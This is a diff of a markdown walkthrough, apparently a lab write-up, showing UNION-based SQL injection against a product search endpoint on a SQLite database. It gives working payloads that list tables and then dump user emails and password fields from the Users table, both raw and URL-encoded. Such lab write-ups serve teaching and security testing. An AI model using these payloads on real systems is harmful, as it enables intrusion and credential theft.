@@ -17,23 +17,34 @@ To detect the number of columns, modify the request in the Repeater by adding ap
 
 Looking at the response, you can see a JSON array containing several objects, each with 9 fields. This suggests that the underlying SQL query returns 9 columns. With this information, the SQL-Payload
 can be prepared. Beforehand, the table and column names for the user credentials need to be identified. One could try guessing `user` or `users` would be logical choices but to be on the safe side, we will query the table names directly from the database metadata. `sqlite_master` is an internal system table in SQLite that stores the complete database structure.
-Because spaces and special characters can cause problems depending on the server configuration, Cyberchef comes into play `https://gchq.github.io/CyberChef/`, a tool for manipulating, analyzing, encrypting, or decrypting a wide variety of data formats.
 
 ```bash
 UNION SELECT name,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--  
 ```
+
+Because spaces and special characters can cause problems depending on the server configuration, Cyberchef comes into play `https://gchq.github.io/CyberChef/`, a tool for manipulating, analyzing, encrypting, or decrypting a wide variety of data formats.
+
 Copy the payload into CyberChef and use the URL Encoding function to make it usable.
 
 <img width="1724" height="742" alt="cyberchef sql" src="https://github.com/user-attachments/assets/51086994-73d8-4900-b040-2ad3047beb8d" />
 
-Copy the output from Cyberchef into the repeater request in burpsuite and send it. The request Should look like this `GET /rest/products/search?q=apple'))UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type='table'--`
+Copy the output from Cyberchef into the repeater request in burpsuite and send it. The request Should look like this 
+```bash
+GET /rest/products/search?q=apple'))UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type='table'--
+```
 
 <img width="1342" height="611" alt="burpsuite3" src="https://github.com/user-attachments/assets/da52dab6-c042-42e6-ab13-16e83f6bf616" />
 
 In the response you can see the JSON array containing all database table names, if you look closely, the table we need is called `Users`.
 
-The Final Payload should now be like this `GET /rest/products/search?q=apple'))UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--` 
-After URL Encode `GET /rest/products/search?q=apple'))UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--`
+The Final Payload should now be like this 
+```bash 
+GET /rest/products/search?q=apple'))UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
+```
+After URL Encode 
+```bash 
+GET /rest/products/search?q=apple'))UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--
+```
 
 <img width="1716" height="1074" alt="credentials" src="https://github.com/user-attachments/assets/6d6a3c64-d7db-4eee-a913-2bff41c88ac4" />
 
